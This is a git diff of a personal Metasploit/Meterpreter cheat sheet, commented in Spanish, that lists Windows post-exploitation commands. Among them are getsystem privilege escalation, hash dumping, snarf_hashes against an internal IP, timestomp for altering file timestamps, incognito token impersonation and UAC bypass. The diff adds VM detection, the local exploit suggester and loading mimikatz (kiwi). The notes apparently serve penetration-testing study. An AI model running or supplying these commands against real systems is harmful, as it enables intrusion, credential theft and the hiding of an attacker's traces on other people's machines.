@@ -5,8 +5,11 @@ getsystem #elevacion de privilegios
 # obtencion de hashes
 hasdump
 
-#Enumeracion de aplicaciones instaladas
+# Enumeracion de aplicaciones instaladas
 run post/windows/gather/enum_applications
+
+## Chek if i am on a VM
+run post/windows/gather/checkvm
 
 ##Descargar archivos ##
 #server-->targer
@@ -14,8 +17,7 @@ upload /home/ubuntu/shuriken/owned.txt C:\\Users\\agaga\\Desktop
 #target-server
 download
 
-
-#modificacion de fechas de ficheros
+# modificacion de fechas de ficheros
 timestomp
 
 # Recolectar informacion
@@ -25,7 +27,7 @@ run post/windows/gather
 
 load -l #disponibles
 
-incognito
+# incognito
 - add_group_user Stinki sticki
 - list_tokens -u
 - snarf_hashes 192.168.1.103
@@ -33,7 +35,7 @@ incognito
 # Wlan Discober
 run post/windows/wlan/wlan_
 
-#Elevar privilejios
+# Elevar privilejios
 run post/windows/escalate/bypassuac
 
 # Usuarios del dominio
@@ -41,3 +43,8 @@ run post/windows/escalate/bypassuac
 
 # Posivilidades de elvebacion de privilejios
 getprivs
+run post/multi/recon/local_exploit_suggester 
+
+## Load last version of mimikatz
+load kiwi
+
